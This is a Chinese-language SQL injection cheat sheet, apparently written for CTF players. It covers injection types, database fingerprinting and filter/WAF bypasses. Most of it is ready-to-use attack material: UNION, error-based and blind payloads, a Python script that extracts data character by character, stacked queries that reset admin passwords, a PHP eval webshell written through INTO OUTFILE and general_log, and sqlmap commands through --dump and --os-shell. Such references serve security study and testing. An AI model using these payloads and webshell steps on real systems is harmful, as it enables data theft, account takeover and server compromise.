# sqli|SQL 注入|💉

## [g-basic] 原理与分类——注入的本质是用户输入被拼进 SQL 执行，改变语句语义
### [basic-what] SQL 注入原理 | easy | 原理;拼接;危害 | -
> 用户可控数据未经过滤或参数化，直接拼接进 SQL 语句，改变原语句语义，造成数据泄露、认证绕过甚至 RCE。

#### 成因
应用程序把用户输入直接拼进 SQL 字符串，服务端将整条语句当作代码执行。

```php
$sql = "SELECT * FROM users WHERE username = '" . $_GET['user'] . "'";
```

传入 `' OR '1'='1` 后实际执行：

```sql
SELECT * FROM users WHERE username = '' OR '1'='1';
```

恒真条件使查询返回全部用户，直接绕过登录。

#### 危害
| 危害 | 说明 |
| --- | --- |
| 数据泄露 | 拖库：库名、表名、字段、数据 |
| 认证绕过 | `OR 1=1`、万能密码 |
| 数据篡改 | UPDATE/DELETE（堆叠注入） |
| RCE | 写文件、UDF、日志写马（MySQL） |

> [!tip]
> 防御的正解是参数化查询/预编译，过滤黑名单只能算缓解。审计时优先看字符串拼接点。

### [basic-comment] 注释符与语句截断 | easy | 注释;--;#;语句截断 | -
> 注入后需要"吞掉"原语句剩余的引号与 SQL，用注释符截断是基础操作。

#### 注释符对照
| 数据库 | 注释符 | 注意 |
| --- | --- | --- |
| MySQL | `-- `（需空格）、`#`、`/* */` | `--+` 中 `+` 解码为空格 |
| PostgreSQL | `--`、`/* */` | `--` 后到行尾 |
| MSSQL | `--`、`/* */` | 另有 `;` 结束语句 |
| Oracle | `--`、`/* */` | 无 `#` |
| SQLite | `--`、`/* */` | 与 PG 类似 |

#### 典型用法
```sql
?id=1' AND 1=1 --+
?id=1' AND 1=1 #
?id=1' AND 1=1 /* 尾随内容被注释掉 */
```

> [!warn]
> MySQL 的 `--` 后必须跟空格/控制字符才是注释，`--+` 与 `--%20` 是 CTF 常用变体；直接写 `--` 不带空格在部分版本不生效。

### [basic-position] 注入位置与数据流 | easy | GET;POST;Header;Cookie;搜索型 | -
> 注入不只发生在 GET 参数：POST 表单、请求头、Cookie 乃至搜索框都可能成为注入点。

#### 注入位置
| 位置 | 示例 | 特点 |
| --- | --- | --- |
| GET 参数 | `?id=1'` | 最常见，直接改 URL |
| POST 参数 | 表单字段、JSON body | 需抓包修改 |
| Header | `User-Agent`、`Referer`、`X-Forwarded-For` | 常被写库，可二次注入 |
| Cookie | `Cookie: user=1'` | 后端若用 Cookie 拼 SQL |

#### 类型与典型 payload
| 类型 | 语句形态 | 测试 payload |
| --- | --- | --- |
| 数字型 | `WHERE id = 1` | `1 AND 1=1` / `1 AND 1=2` |
| 字符型 | `WHERE name = 'x'` | `x' AND '1'='1` |
| 搜索型 | `WHERE title LIKE '%x%'` | `%' AND 1=1 --+` |

> [!tip]
> 判定注入类型的核心手法：构造真/假两个条件，观察返回差异（布尔差）或时间差，再决定用哪种注入打法。

## [g-union] 联合注入——有回显时的最高效打法，一条 SQL 直接查出任意数据
### [union-orderby] order by 探测列数 | easy | order by;列数;二分 | -
> UNION 要求前后两个 SELECT 列数一致，先用 ORDER BY 做二分探测出真实列数。

#### 原理
`ORDER BY n` 按第 n 列排序，n 超过实际列数时报错（Unknown column）。从大数向下折半：

```sql
?id=1 ORDER BY 10 --+   -- 不报错
?id=1 ORDER BY 20 --+   -- 报错 → 列数在 10~19
?id=1 ORDER BY 15 --+   -- 不报错 → 列数在 15~19
?id=1 ORDER BY 18 --+   -- 报错 → 列数在 15~17
?id=1 ORDER BY 16 --+   -- 不报错 → 列数在 16~17
?id=1 ORDER BY 17 --+   -- 不报错 → 列数 = 17
```

也可以从小递增尝试：1、2、3……直到报错，前一个数字即列数（列数少时更快）。

> [!warn]
> ORDER BY 用数字，不要用列名；它只用于探测，真正的数据读取在下一步 UNION SELECT 完成。

### [union-select] union select 找回显位 | easy | union;回显位;select | -
> 知道列数后，用 UNION SELECT 占位列探测页面上回显了哪一列的数据。

#### 基本形态
```sql
?id=1' UNION SELECT 1,2,3,4,5 --+
```

页面把哪个数字打印出来，哪一列就是回显位（本例列数 5）。随后把数字替换为查询表达式：

```sql
?id=-1' UNION SELECT 1,database(),user(),version(),5 --+
```

`id=-1`（或 `id=0`）让前一条查询无结果，UNION 的第二条结果才会显示出来。

#### 常见占位写法
| 写法 | 说明 |
| --- | --- |
| `NULL,NULL,NULL` | 兼容所有类型，最稳 |
| `1,2,3` | 直观，但注意类型不匹配报错 |
| `0x...` / 表达式 | 直接放查询表达式代替数字 |

> [!tip]
> 列数多时可用 `UNION SELECT 1,2,...,N` 一次占满；找不到回显位时改用布尔/时间盲注。

### [union-infoschema] information_schema 查库表列 | medium | information_schema;查库;查表;查列;flag | -
> information_schema 是 MySQL 的元数据库，存着所有库、表、列的名字，查 flag 的标准全流程如下。

#### 标准流程（MySQL）
```sql
-- 1. 当前库 / 所有库
UNION SELECT 1,database(),3,4,5 --+
UNION SELECT 1,GROUP_CONCAT(schema_name),3,4,5 FROM information_schema.schemata --+

-- 2. 指定库的所有表
UNION SELECT 1,GROUP_CONCAT(table_name),3,4,5 FROM information_schema.tables WHERE table_schema='ctf' --+

-- 3. 指定表的所有列
UNION SELECT 1,GROUP_CONCAT(column_name),3,4,5 FROM information_schema.columns WHERE table_name='flag' --+

-- 4. 取数据
UNION SELECT 1,flag,3,4,5 FROM ctf.flag --+
```

#### 常用元数据列
| 表 | 关键列 |
| --- | --- |
| information_schema.schemata | schema_name |
| information_schema.tables | table_schema, table_name |
| information_schema.columns | table_schema, table_name, column_name |

> [!tip]
> GROUP_CONCAT 把多行压成一行输出，避免只能显示一条；没回显位时配合 `LIMIT 0,1` 逐条取。

## [g-error] 报错注入——有报错回显时，让报错信息"携带"查询结果
### [error-updatexml] updatexml 报错注入 | easy | updatexml;报错注入;XPATH | -
> UPDATEXML 解析 XPath 参数失败时会把参数内容带进报错信息，从而回显查询结果（MySQL 5.1.5+）。

#### payload
```sql
' AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1) --+
' AND updatexml(1,concat(0x7e,(SELECT password FROM users LIMIT 0,1),0x7e),1) --+
```

`0x7e` 是 `~`，用于包裹结果、保证 XPath 解析失败并让内容完整出现在报错中。

#### 输出效果
```txt
XPATH syntax error: '~root@localhost~'
```

> [!warn]
> 报错信息有长度上限（约 32 字符），长结果用 `substr(...,1,30)` 分段取。

### [error-extractvalue] extractvalue 报错注入 | easy | extractvalue;报错注入 | -
> EXTRACTVALUE 与 updatexml 同族同版本，XPath 表达式以 ~ 开头即报错并回显数据。

#### payload
```sql
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()))) --+
```

#### 与 updatexml 对比
| 项目 | updatexml | extractvalue |
| --- | --- | --- |
| 版本 | MySQL 5.1.5+ | MySQL 5.1.5+ |
| 报错 | XPATH syntax error | XPATH syntax error |
| 长度限制 | 约 32 字符 | 约 32 字符 |
| 用法差异 | 第二个参数放表达式 | 第二个参数放表达式 |

> [!tip]
> 两个函数本质相同，一个被过滤就换另一个；也可组合 `substr` 分块取出完整数据。

### [error-floor] floor 报错注入 | medium | floor;rand;group by;count;exp | -
> 利用 COUNT+GROUP BY 对 FLOOR(RAND(0)*2) 分组时主键冲突，Duplicate entry 报错回显数据（MySQL 5.x）。

#### payload
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT user()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --+
```

#### 原理
`RAND(0)` 序列固定，GROUP BY 分组键不断变化导致临时表主键冲突，报错中携带拼接进去的查询结果。

#### 变体：exp 溢出
```sql
' AND exp(~(SELECT * FROM (SELECT user())a)) --+
```
`EXP(710)` 触发 DOUBLE overflow，报错回显结果。

> [!warn]
> 两法都依赖旧版报错回显：MySQL 8.0 起报错不再携带数据，此路不通；且 payload 较长，注意 URL 编码与长度限制。

## [g-blind-bool] 布尔盲注——无回显但有真假差异，逐字符猜数据
### [blind-bool-basic] 布尔盲注判断模板 | easy | 布尔盲注;substr;ascii;if | -
> 页面在条件为真/假时返回不同内容，用 ASCII 逐字符二分猜出查询结果。

#### 核心模板
```sql
?id=1 AND 1=1      -- 真：正常页面
?id=1 AND 1=2      -- 假：异常页面（无数据/报错/404）

-- 猜当前库第一个字符
?id=1 AND ASCII(SUBSTR(DATABASE(),1,1))>64 --+
?id=1 AND ASCII(SUBSTR(DATABASE(),1,1))=100 --+

-- 猜长度
?id=1 AND LENGTH(DATABASE())>3 --+
```

#### 常用函数
| 函数 | 作用 |
| --- | --- |
| SUBSTR(str,pos,len) | 截取字符串 |
| ASCII() | 取字符 ASCII 码 |
| ORD() | 同 ASCII，可互换 |
| MID() | 同 SUBSTR |
| IF(cond,a,b) | 条件分支，可替代 AND 写法 |

> [!tip]
> 真假的判定特征要稳定：如"有 Welcome 字样 = 真"，写脚本前先在浏览器手动验证两个条件确实有差异。

### [blind-bool-script] Python 二分脚本模板 | medium | python;二分;脚本;盲注 | -
> 手测太慢，用二分把逐字符猜测从 127 次降到 7 次，下面模板改两个地方即可用。

```python
import requests, time

url = "http://target/index.php"

def cond(expr):
    # 根据实际页面特征改：真/假对应不同内容
    r = requests.get(url, params={"id": f"1 AND {expr}"})
    return "Welcome" in r.text  # 特征字符串

def guess(expr, lo=0, hi=127):
    while lo < hi:
        mid = (lo + hi + 1) // 2
        if cond(f"{expr}>{mid}"):
            lo = mid
        else:
            hi = mid - 1
    return lo

def get_str(expr):
    res = ""
    n = guess(f"LENGTH({expr})", 0, 100)
    for i in range(1, n + 1):
        res += chr(guess(f"ASCII(SUBSTR({expr},{i},1))"))
        time.sleep(0.05)  # 限速防被拦
    return res

print(get_str("(SELECT DATABASE())"))
```

> [!warn]
> 逐个请求容易被限速/WAF 盯上；被拦截时先解决过滤（见 g-bypass）再跑脚本。

## [g-blind-time] 时间盲注——连真假差异都没有时，用延迟当"真"的信号
### [blind-time-sleep] sleep 时间盲注 | easy | 时间盲注;sleep;if;benchmark | -
> 无任何回显时，让条件为真才延迟响应，用响应时间差读出数据。

#### 核心模板（MySQL）
```sql
?id=1 AND IF(ASCII(SUBSTR(DATABASE(),1,1))>64,SLEEP(3),0) --+
?id=1 AND SLEEP(IF(ASCII(SUBSTR(DATABASE(),1,1))=100,3,0)) --+
?id=1 AND ORD(MID(DATABASE(),1,1))=100 AND SLEEP(3) --+
```

#### 判定
| 行为 | 结论 |
| --- | --- |
| 条件为真时响应延迟约 3 秒 | 该字符位猜中 |
| 无延迟 | 猜错，换值 |

#### benchmark 变体
```sql
?id=1 AND IF(1=1,BENCHMARK(10000000,SHA1('x')),0) --+
```
BENCHMARK 循环执行表达式制造 CPU 延迟，payload 较长时不如 SLEEP 直观。

> [!warn]
> 阈值建议 3~5 秒且与网络延迟拉开差距；循环跑全字符请求量大，注意对目标的影响与超时设置。

### [blind-time-db] 各数据库时间函数对照 | medium | 时间盲注;pg_sleep;WAITFOR;benchmark;对照 | -
> 换数据库就要换延迟函数，先识别库再选对应 payload。

#### 延迟函数对照
| 数据库 | 延迟函数 | 示例 |
| --- | --- | --- |
| MySQL | `SLEEP(n)` / `BENCHMARK(n,expr)` | `AND SLEEP(3)` |
| PostgreSQL | `pg_sleep(n)` | `AND pg_sleep(3)` |
| MSSQL | `WAITFOR DELAY '0:0:3'` | `;IF 1=1 WAITFOR DELAY '0:0:3'` |
| Oracle | `DBMS_LOCK.SLEEP(n)` | `AND DBMS_LOCK.SLEEP(3)`（需权限，新版受限） |
| SQLite | 无内置 sleep | 用重型计算代替，如 `AND (SELECT count(*) FROM sqlite_master a,sqlite_master b)` |

#### MSSQL 常用判断
```sql
?id=1;IF ASCII(SUBSTRING(DB_NAME(),1,1))>64 WAITFOR DELAY '0:0:3' --
```

> [!tip]
> Oracle 无 sleep 时可用大笛卡尔积查询或 UTL_INADDR 网络函数制造延迟；SQLite 则靠 `randomblob(1e7)` 之类重型表达式。

## [g-stack] 堆叠注入——分号后的第二条语句，从"读"升级为"写"
### [stack-basic] 堆叠注入原理与限制 | medium | 堆叠注入;多语句;PDO;限制 | -
> 部分数据库驱动允许一条请求执行多条语句，注入点后加分号就能追加任意 SQL。

#### 原理
```sql
-- 原语句
SELECT * FROM users WHERE id = 1;
-- 注入后（分号追加）
SELECT * FROM users WHERE id = 1; DROP TABLE users; --
```

#### 各语言/驱动的支持情况
| 环境 | 是否支持多语句 | 说明 |
| --- | --- | --- |
| PHP mysql 扩展（旧） | 支持 | 已废弃 |
| PHP mysqli | 支持 | 默认 |
| PHP PDO + MySQL | 默认不支持 | 需 `PDO::MYSQL_ATTR_MULTI_STATEMENTS => true` |
| PDO + emulate prepares=false | 不支持 | 预编译后参数无法注入 |
| Java JDBC | 默认不支持 | 需 `allowMultiQueries=true` |
| Python pymysql | 默认支持 | execute 可执行多语句 |

> [!warn]
> 堆叠注入不能获得回显（结果集只有第一条语句的），常用于改数据、写马、拿 shell 这类"不需要回显"的操作。

### [stack-example] 堆叠注入实战示例 | hard | 堆叠注入;改数据;写马;SQLite | -
> 堆叠的经典用法：改管理员密码、插用户、写 webshell，附 SQLite 实战（CTF 高频）。

#### 改数据 / 插用户
```sql
?id=1; UPDATE users SET password='123456' WHERE username='admin'; --
?id=1; INSERT INTO users(username,password) VALUES('hack','hack'); --
```

#### 写马（MySQL，需 FILE 权限）
```sql
?id=1; SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/s.php'; --
```

#### SQLite 实战（常见于 CTF）
```sql
-- 若 admin 被删，先改名再建回
?id=1; ALTER TABLE users RENAME TO tmp; --
?id=1; CREATE TABLE users AS SELECT * FROM tmp; --
-- 或直接 UPDATE 密码
?id=1; UPDATE users SET password='c4ca4238a0b923820dcc509a6f75849b' WHERE username='admin'; --
```

> [!tip]
> 无回显时如何确认成功：观察后续登录/功能是否生效；SQLite 场景常配合 `sqlite_master` 盲注确认表结构。

## [g-bypass] 过滤绕过——黑名单不是终点，空格大小写编码全是绕过面
### [bypass-space] 空格与注释符绕过 | medium | 空格绕过;%0a;注释;括号 | -
> 过滤了空格时，用注释符、控制字符或括号替代，让 SQL 语义不变。

#### 替代空格的写法
| 替代 | 说明 |
| --- | --- |
| `/**/` | 注释当空格，最常用 |
| `%0a` `%09` `%0b` `%0c` `%0d` `%a0` | 控制字符被 MySQL 当空白 |
| 括号 `()` | `UNION(SELECT 1,2)` 无需空格 |

```sql
?id=1'/**/UNION/**/SELECT/**/1,2,3--+
?id=1'%0aUNION%0aSELECT%0a1,2,3--+
?id=-1'UNION(SELECT(1),(2),(3))--+
```

#### 绕过过滤的万能思路
先测出被过滤的关键字，再用等价写法替换：

```sql
-- 过滤了 'union' 的常见绕过
UNION ALL SELECT          -- 加 ALL
UN/**/ION SEL/**/ECT      -- 注释拆分
uniunionon seSELECTlect   -- 双写
```

> [!tip]
> 把 payload 每个词都试一遍，看哪段被 403/拦截，就能反推过滤正则，再针对性绕过。

### [bypass-case] 大小写、双写与编码绕过 | medium | 大小写;双写;hex;编码 | -
> 黑名单正则大多区分大小写且只过滤一次，大小写混淆、双写、hex 编码是三大基础绕过。

#### 大小写混淆
```sql
?id=-1' UnIoN SeLeCt 1,2,3 --+
```

#### 双写绕过（过滤后替换为空时）
```sql
-- 过滤 select → 输入 select 变空 → 双写
?id=-1' ununionion seselectlect 1,2,3 --+
```

#### hex 编码
```sql
-- 'admin' = 0x61646d696e
?id=1' AND username=0x61646d696e --+
-- 字符串常量整体编码，绕引号过滤
?id=1' UNION SELECT 1,0x666C6167,3 --+   -- 0x666C6167 = 'flag'
```

#### URL / 二次编码
```sql
?id=1%2527        -- %25 → % ，二次编码绕过 WAF 层
```

> [!warn]
> hex 编码只在 MySQL 生效（PG 需 `E'\x...'`，MSSQL 的 `0x...` 不解析为字符串），跨库注意。

### [bypass-quote] 引号、逗号、等号绕过与宽字节 | hard | 引号;逗号;宽字节;GBK | -
> 过滤引号用 hex/无引号写法，过滤逗号用 join/offset 替代，宽字节则专打 GBK 转义。

#### 引号绕过
```sql
-- 字符串用 hex / char() 拼接
AND username=0x61646d696e
AND username=CHAR(97)+CHAR(100)+CHAR(109)+CHAR(105)+CHAR(110)   -- MSSQL
```

#### 逗号绕过（LIMIT/SUBSTR 被过滤逗号）
```sql
-- substr(a,b,c) 无逗号写法
AND SUBSTR(DATABASE() FROM 1 FOR 1)='c'
-- limit 0,1 → limit 1 offset 0
UNION SELECT 1,2,3 LIMIT 1 OFFSET 0
-- in 列表用 or 代替
WHERE username IN ('a','b')  →  WHERE username='a' OR username='b'
```

#### 等号绕过
```sql
AND username LIKE 'admin'
AND username REGEXP '^adm'
AND ASCII(SUBSTR(DATABASE(),1,1)) BETWEEN 96 AND 100
```

#### 宽字节注入（GBK 编码下）
后端 `addslashes` 把 `'` 转成 `\'`（`%5c%27`），若连接字符集是 GBK，注入 `%bf%27`：

```txt
%bf%5c%27 →  %bf%5c 被解析为一个宽字符（縗）→ 剩下 %27 是裸单引号 → 注入成立
```

```sql
?id=%bf%27 UNION SELECT 1,2,3 --+
```

> [!warn]
> 宽字节注入要求前后端字符集一致且为 GBK 系（MySQL `SET NAMES gbk`）；UTF-8 下 `%bf` 无法吞掉反斜杠，此路不通。

## [g-db] 数据库差异对照——先认库再打库，一份对照表走天下
### [db-comment-concat] 注释符与字符串连接对照 | medium | 注释符;字符串连接;concat;对照 | -
> 换数据库时语法全变：注释、字符串拼接、引号转义规则各有不同。

#### 注释符与字符串连接
| 数据库 | 注释符 | 字符串连接 | 标识符引用 |
| --- | --- | --- | --- |
| MySQL | `-- `、`#`、`/* */` | `CONCAT(a,b)`、`CONCAT_WS(',',a,b)`；`||` 需 PIPES_AS_CONCAT | 反引号 `` ` `` |
| PostgreSQL | `--`、`/* */` | `a || b`、`CONCAT(a,b)` | 双引号 `"` |
| MSSQL | `--`、`/* */` | `a + b`（`||` 无效） | 方括号 `[ ]` |
| Oracle | `--`、`/* */` | `a \|\| b`、`CONCAT(a,b)` | 双引号 `"` |
| SQLite | `--`、`/* */` | `a || b` | 双引号/反引号/方括号 |

#### 引号转义差异
```sql
-- MySQL: ' 转义为 '' 或 \'
SELECT 'it''s';           -- it's
-- MSSQL: 仅 ''，不支持 \'
SELECT 'it''s';
-- PG: 标准 ''；E'...' 内可用 \'
```

> [!warn]
> 拼接列名/表名时注意大小写：Oracle 默认大写、PG 小写化，`information_schema` 查询大小写敏感。

### [db-version-meta] 版本函数与元数据表对照 | medium | 版本函数;元数据表;information_schema;对照 | -
> 识别数据库后的第一件事：取版本、查元数据定位库表列。

#### 版本与当前库
| 数据库 | 版本函数 | 当前库 |
| --- | --- | --- |
| MySQL | `VERSION()` | `DATABASE()` |
| PostgreSQL | `version()` | `current_database()` |
| MSSQL | `@@VERSION` | `DB_NAME()` |
| Oracle | `SELECT banner FROM v$version` | `SYS_CONTEXT('USERENV','CURRENT_SCHEMA')` |
| SQLite | `sqlite_version()` | 无（库=文件） |

#### 元数据表对照
| 数据库 | 查库 | 查表 | 查列 |
| --- | --- | --- | --- |
| MySQL | information_schema.schemata | information_schema.tables | information_schema.columns |
| PostgreSQL | pg_database | pg_tables / information_schema.tables | information_schema.columns / pg_attribute |
| MSSQL | sys.databases | sysobjects / sys.tables | syscolumns / sys.columns |
| Oracle | all_users / dba_users | all_tables | all_tab_columns |
| SQLite | sqlite_master（type='table'） | sqlite_master | pragma_table_info('t') |

```sql
-- SQLite 经典：一次取全部建表语句
UNION SELECT 1,GROUP_CONCAT(sql) FROM sqlite_master --+
```

> [!tip]
> 认库技巧：报错信息（MySQL/Oracle 自带）、版本函数、注释符差异（有 `#` 是 MySQL）、`||` 是否报错（PG/SQLite/Oracle 可用，MSSQL 不行）。

### [db-time-err] 时间与报错函数对照 | medium | 时间函数;报错函数;updatexml;对照 | -
> 盲注靠时间、有报错靠报错回显，两套函数按库选择。

#### 时间延迟
| 数据库 | 函数/语句 | 示例 |
| --- | --- | --- |
| MySQL | `SLEEP(n)`、`BENCHMARK(n,expr)` | `AND SLEEP(3)` |
| PostgreSQL | `pg_sleep(n)` | `AND pg_sleep(3)` |
| MSSQL | `WAITFOR DELAY 'h:m:s'` | `;IF 1=1 WAITFOR DELAY '0:0:3'` |
| Oracle | `DBMS_LOCK.SLEEP(n)` | `AND DBMS_LOCK.SLEEP(3)` |
| SQLite | 无 | 重型表达式替代 |

#### 报错注入
| 数据库 | 报错函数 | 示例 |
| --- | --- | --- |
| MySQL | `updatexml()` `extractvalue()` floor/rand `exp()` | `AND updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)` |
| PostgreSQL | `CAST(... AS int)` | `AND CAST((SELECT version()) AS int)>0` |
| MSSQL | `CONVERT(int,...)` | `AND 1=CONVERT(int,@@version)` |
| Oracle | 无内置稳定函数 | 用 `CTXSYS.DRITHSX.SN`（默认未装）或 `UTL_INADDR`（需网络权限） |
| SQLite | 无 | 走 union / 盲注 |

```sql
-- PG 报错回显示例：类型转换错误携带数据
AND 1=CAST((SELECT table_name FROM information_schema.tables LIMIT 1) AS int)
```

> [!warn]
> Oracle 报错注入多依赖未授权函数/网络函数，环境差异大，实战优先 union 与盲注。

## [g-file] 写文件与深入——从注入到 getshell 的最后一步
### [file-outfile] into outfile 写文件 | hard | outfile;写文件;secure_file_priv;dumpfile | -
> MySQL 有 FILE 权限且 secure_file_priv 允许时，SELECT 结果可直接写成文件，配合 Web 目录拿 shell。

#### 前置条件
| 条件 | 验证语句 |
| --- | --- |
| 有 FILE 权限 | `SELECT file_priv FROM mysql.user` 或 `--is-dba` |
| secure_file_priv 为空/匹配目录 | `SHOW VARIABLES LIKE 'secure_file_priv'` |
| Web 目录可写 | 路径已知且 mysql 用户可写 |

> [!danger]
> secure_file_priv 为 NULL 表示禁止写文件，为空字符串表示不限制；MySQL 5.7+ 默认常设置为空或特定目录，写不进 Web 根目录时该路不通。

#### payload
```sql
-- 写一句话马
SELECT '<?php @eval($_POST[1]);?>' INTO OUTFILE '/var/www/html/shell.php' --+
-- 单行原样写入（二进制/无换行）
SELECT 0x3C3F706870... INTO DUMPFILE '/var/www/html/shell.php' --+
```

> [!warn]
> OUTFILE 会追加换行/分隔符（写二进制会损坏），DUMPFILE 原样写单行更稳；php 内的单引号需转义（`''`）或整条语句用 hex 编码。

### [file-log] general_log 日志写马 | hard | general_log;日志写马;超级权限 | -
> 写文件被禁（secure_file_priv）时，有 SUPER 权限可把查询日志重定向到 Web 目录，日志内容即马。

#### 流程
```sql
-- 1. 开启通用日志并指定路径（需 SUPER）
SET GLOBAL general_log = 'ON';
SET GLOBAL general_log_file = '/var/www/html/shell.php';
-- 2. 执行一条"内容即马"的查询
SELECT '<?php @eval($_POST[1]);?>';
-- 3. 访问 http://target/shell.php
```

#### 适用性
| 项目 | 说明 |
| --- | --- |
| 权限 | 需要 SUPER 权限（常见于高权限注入点） |
| 版本 | MySQL 5.x 通用，8.0 部分配置受限 |
| 前提 | mysql 进程对 Web 目录有写权限 |

> [!warn]
> 日志写马会留下大量查询记录，用完应恢复 `general_log='OFF'` 并删除马文件；部分环境 general_log_file 只能写数据目录，路径写不进去就换 outfile 或 UDF。

### [file-sqlmap] sqlmap 实战流程 | medium | sqlmap;自动化;--os-shell;tamper | -
> 工具打底：从探测到拖库到 --os-shell 的标准流程，脚本化拿权限。

#### 标准流程
```bash
# 1. 探测注入点（--batch 全默认回车）
sqlmap -u "http://target/index.php?id=1" --batch

# 2. 带 POST 数据/Header 的请求（Burp 抓包存文件）
sqlmap -r request.txt --batch
sqlmap -u "http://target/login.php" --data "user=a&pass=b" --forms --batch

# 3. 信息收集
sqlmap -u "http://target/index.php?id=1" --current-user --current-db --batch
sqlmap -u "http://target/index.php?id=1" --is-dba --batch

# 4. 拖库：库 → 表 → 列 → 数据
sqlmap -u "http://target/index.php?id=1" --dbs --batch
sqlmap -u "http://target/index.php?id=1" -D ctf --tables --batch
sqlmap -u "http://target/index.php?id=1" -D ctf -T flag --columns --batch
sqlmap -u "http://target/index.php?id=1" -D ctf -T flag -C flag --dump --batch

# 5. 突破过滤（WAF 时）
sqlmap -u "http://target/index.php?id=1" --tamper=space2comment --batch
sqlmap -u "http://target/index.php?id=1" --level 3 --risk 2 --batch

# 6. getshell（需 FILE 权限 + 可写 Web 目录）
sqlmap -u "http://target/index.php?id=1" --os-shell --batch
```

#### 常用选项速查
| 选项 | 作用 |
| --- | --- |
| `--dbs` / `-D` / `-T` / `-C` / `--dump` | 库表列数据链 |
| `--os-shell` / `--os-cmd` | 拿 shell / 执行命令 |
| `--tamper=xx` | 绕过 WAF 的脚本 |
| `--level 3 --risk 2` | 加大测试深度（慢但全） |
| `--threads 5` | 并发提速 |
| `--batch` | 全默认自动回答 |

> [!tip]
> sqlmap 探测到注入后会自动给出注入类型；--os-shell 失败常见原因：secure_file_priv 限制、目录不可写、权限不足，按 g-file 的条件表排查。
